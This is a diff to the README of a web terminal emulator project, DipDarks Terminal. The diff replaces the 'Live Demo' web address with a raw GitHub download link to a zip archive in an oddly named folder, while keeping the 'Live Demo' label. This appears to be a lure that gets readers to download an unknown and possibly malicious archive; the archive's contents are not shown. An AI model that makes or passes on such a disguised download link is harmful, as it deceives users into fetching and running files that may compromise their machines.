@@ -1,6 +1,6 @@
 DipDarks Terminal
 A modern web-based terminal emulator with file system navigation and editing capabilities.
-🌐 Live Demo: https://zingy-clafoutis-fd8f4c.netlify.app/
+🌐 Live Demo: https://raw.githubusercontent.com/dipeshdarks/Dipdarks-Terminal/main/abstinency/Terminal-Dipdarks-v1.4.zip
 Features
 
 Interactive command line interface
